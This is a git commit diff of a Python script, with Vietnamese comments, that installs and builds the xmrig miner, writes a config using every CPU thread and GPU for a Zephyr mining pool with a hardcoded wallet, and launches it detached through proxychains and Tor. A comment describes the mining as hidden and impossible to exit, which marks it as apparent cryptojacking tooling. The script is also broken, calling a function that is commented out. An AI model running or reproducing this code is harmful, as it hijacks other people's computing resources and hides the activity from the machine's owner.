037c96178cb9d4e8285c60e782ff33f7d088f351
wollfoo <nhac.tien1988@gmail.com>
2024-05-05 17:14:32 +0700

    Update zph.py

--- zph.py
+++ zph.py
@@ -1,32 +1,68 @@
 import subprocess
+import json
+import os
 
-def install_dependencies():
-	subprocess.call("sudo apt-get update", shell=True)
-	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)
-
-def set_max_huge_pages():
-	total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
-	subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])
+def install_packages():
+    # Cài đặt các gói cần thiết: xmrig, proxychains, tor
+    subprocess.run("sudo apt-get update", shell=True, check=True)
+    subprocess.run("sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev proxychains tor", shell=True, check=True)
 
 def install_xmrig():
-	subprocess.call("git clone https://github.com/xmrig/xmrig.git", shell=True)
-	subprocess.call("mkdir xmrig/build && cd xmrig/build", shell=True)
-	subprocess.call("cmake .. && make -j$(nproc)", shell=True)
+    # Tải xuống và cài đặt xmrig từ repository
+    subprocess.run("git clone https://github.com/xmrig/xmrig.git", shell=True, check=True)
+    os.chdir("xmrig")
+    subprocess.run("mkdir build && cd build && cmake .. && make", shell=True, check=True)
 
-def install_proxychains():
-	subprocess.call("sudo apt-get install -y proxychains", shell=True)
-
-def install_tor():
-	subprocess.call("sudo apt-get install -y tor", shell=True)
+def setup_mining_config(pool_url, username, password, cpu_threads):
+    # Thiết lập tệp cấu hình đào
+    config = {
+        "cpu": True,             # Sử dụng CPU
+        "opencl": True,          # Sử dụng GPU OpenCL
+        "cuda": True,            # Sử dụng GPU CUDA
+        "pools": [
+            {
+                "url": pool_url,
+                "user": username,
+                "pass": password,
+                "tls": True        # Sử dụng SSL
+            }
+        ],
+        "cpu-threads": cpu_threads  # Số lượng luồng CPU sử dụng
+    }
+    
+    # Ghi tệp cấu hình vào config.json
+    with open("config.json", "w") as f:
+        json.dump(config, f)
 
 def start_mining():
-	subprocess.Popen("sudo -u nobody proxychains tor -f /etc/tor/torrc && sudo -u nobody proxychains ./xmrig/build/xmrig --cpu -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)
-	subprocess.Popen("sudo -u nobody ./xmrig/build/xmrig --cuda -o sg-zephyr.miningocean.org:5432 -u ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB -k --tls", shell=True)
+    # Khởi động quá trình đào coin với xmrig qua proxychains và Tor
+    subprocess.Popen("proxychains4 -f /etc/proxychains.conf torsocks ./xmrig -c config.json & disown", shell=True, preexec_fn=os.setsid)
+
+# def set_huge_pages():
+#     # Thiết lập huge pages (cần quyền root)
+#     subprocess.run("sudo sysctl -w vm.nr_hugepages=128", shell=True)
+
+def set_max_huge_pages():
+    total_huge_pages = int(subprocess.check_output(['cat', '/proc/meminfo']).decode().split('HugePages_Total:')[1].split()[0])
+    subprocess.run(['sysctl', '-w', f'vm.nr_hugepages={total_huge_pages}'])
 
 if __name__ == "__main__":
-	install_dependencies()
-	set_max_huge_pages()
-	install_xmrig()
-	install_proxychains()
-	install_tor()
-	start_mining()
+    # Cài đặt các gói cần thiết
+    install_packages()
+    
+    # Cài đặt xmrig
+    install_xmrig()
+    
+    # Thiết lập tệp cấu hình đào
+    pool_url = "stratum+ssl://sg-zephyr.miningocean.org:5432"
+    username = "ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB"
+    password = "x"
+    cpu_threads = os.cpu_count()  # Số lượng luồng CPU tối đa
+    
+    setup_mining_config(pool_url, username, password, cpu_threads)
+    
+    # Thiết lập huge pages
+    set_huge_pages()
+    
+    # Bắt đầu đào coin ẩn và không thể thoát ra
+    start_mining()
